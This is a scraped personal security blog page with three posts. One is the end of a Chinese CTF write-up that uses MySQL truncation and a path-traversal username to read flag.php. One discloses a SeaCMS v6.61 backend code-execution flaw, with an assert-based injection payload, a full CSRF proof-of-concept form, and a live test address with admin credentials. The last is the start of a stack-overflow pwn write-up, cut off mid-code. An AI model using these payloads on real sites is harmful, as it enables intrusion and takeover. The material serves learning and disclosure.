class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">  <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</span><br><span class="line">  email <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> articles (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">user_id <span class="built_in">int</span>(<span class="number">32</span>),</span><br><span class="line">title <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">500</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> avatar (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line"><span class="keyword">data</span> <span class="built_in">blob</span>,</span><br><span class="line">user_id <span class="built_in">int</span>(<span class="number">32</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">filepath <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line">photo_type <span class="built_in">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到这里的sql文件中限制了图片路径<code>filepath</code>字段的长度最多为100，用户名<code>username</code>的长度也最多为100。这里便可以联想到mysql的一个性质：<code>当mysql开启宽松模式时，在INSERT的时候，如果你插入的字符超出了MySQL的字段长度，MySQL会自动截断到最大长度然后插入，并不会出错。</code>，具体可以参考这篇文章：<a href="http://www.91ri.org/5963.html">http://www.91ri.org/5963.html</a><br><br>因此我们如果注册长度为100的用户名，在将文件名写入数据库时，用户名之后拼接的后缀便会被截断从而无法进入数据库，因此便实现了我们对文件的控制。<br><br>最后解题的方法为：</p><p></p>
<ul><br><li>注册用户名：<code>..//////////////////////////////////////////////////////////////////////////////////////////flag.php</code><br></li><br><li>edit处随意上传一张图片</li><br><li>export处导出数据，便可获得flag。</li><br></ul><br><p> </p><br><h2 name="h2-3" id="h2-3">总结</h2><br><p>这场比赛整体难度适中，比较适合新手用于提高自己的水平。此外比赛源码已经上传到<a href="https://github.com/susers/Writeups">https://github.com/susers/Writeups</a>上，欢迎大家star与pull request！</p><br><p> </p><br><h2 name="h2-4" id="h2-4">参考资料</h2><br><ul><br><li><a href="http://php.net/manual/zh/language.operators.comparison.php">http://php.net/manual/zh/language.operators.comparison.php</a></li><br><li><a href="http://www.freebuf.com/articles/web/159342.html">http://www.freebuf.com/articles/web/159342.html</a></li><br><li><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></li><br><li><a href="http://www.91ri.org/5963.html">http://www.91ri.org/5963.html</a></li><br></ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/seacms-backend-getshell/index.html" itemprop="url">
                  seacms backend getshell
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-07-18 11:30:58" itemprop="dateCreated datePublished" datetime="2018-07-18T11:30:58+08:00">2018-07-18</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="backend-RCE-in-the-latest-version-of-SeaCMS-v6-61"><a href="#backend-RCE-in-the-latest-version-of-SeaCMS-v6-61" class="headerlink" title="backend RCE in the latest version of SeaCMS(v6.61)"></a>backend RCE in the latest version of SeaCMS(v6.61)</h1><p>In SeaCMS’s admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture’s url,we can execute random code to getshell.though there are some way’s in the /include/main.class to limit the usage of the code,we can find ways to bypass it.<br>So How does this vul be triggerd? here are some Steps:  </p>
<ul>
<li>Firstly login to the admin panel, in this case the admin directory is adjusted to <code>/backend</code>.<br><img src="http://p7lc13qga.bkt.clouddn.com/backend.PNG" alt=""></li>
<li>Secondly add a movie and set it’s pictrue address as <code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code><br><img src="http://p7lc13qga.bkt.clouddn.com/add.png" alt=""></li>
<li>After adding it visit <code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();</code>you can find <code>phpinfo()</code> is executed.<br>here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html.<br><img src="http://p7lc13qga.bkt.clouddn.com/vul.PNG" alt=""></li>
<li>Or you can just visit <code>/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code>or any other places that display the video’s pic you have just added.</li>
</ul>
<p>Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.<br>csrf poc is here:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- adjust action to your url --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/seacms/backend/admin_video.php?action=save&amp;acttype=add"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;name"</span> <span class="attr">value</span>=<span class="string">"getshell"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;enname"</span> <span class="attr">value</span>=<span class="string">"ceshi"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;color"</span> <span class="attr">value</span>=<span class="string">"&amp;#35;FF0000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;type"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;state"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;pic"</span> <span class="attr">value</span>=<span class="string">"&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;spic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;gpic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;actor"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;director"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;note"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tags"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select3"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publishyear"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select2"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;lang"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select1"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publisharea"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select4"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;ver"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;hit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;monthhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;weekhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;dayhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;len"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;total"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;nickname"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;company"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tvs"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;douban"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;mtime"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;imdb"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;score"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;scorenum"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;longtxt"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;money"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;psd"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;content"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"�&amp;#161;&amp;#174;�&amp;#174;&amp;#154;�&amp;#143;&amp;#144;浜&amp;#164;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>you can test this vul at <code>http://111.230.11.248:10089/backend/</code>,and the username and password is admin|admin.</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html" itemprop="url">
                  pwn的初体验-qctf Xman-stack2 writeup
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-07-15 22:55:05" itemprop="dateCreated datePublished" datetime="2018-07-15T22:55:05+08:00">2018-07-15</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>昨天去打了打QCTF，水了3道web题目后便草草收场。表示这场比赛真的只是一场萌新赛吗。。。。由于队伍里面向来缺pwn手，所以便计划把这场比赛的pwn题目也做一下练练手，限于水平太菜也就做了个stack2这道题。</p>
</blockquote>
<h2 id="分析程序利用点"><a href="#分析程序利用点" class="headerlink" title="分析程序利用点"></a>分析程序利用点</h2><p>首先 checksec查看程序的保护情况<br><img src="http://p7lc13qga.bkt.clouddn.com/checksec.png" alt="checksec"><br>可以卡暗道开启了栈不可执行保护和CANARY。<br>先把程序拖到IDA里面然后F5大法好。。。得到main函数的伪代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span 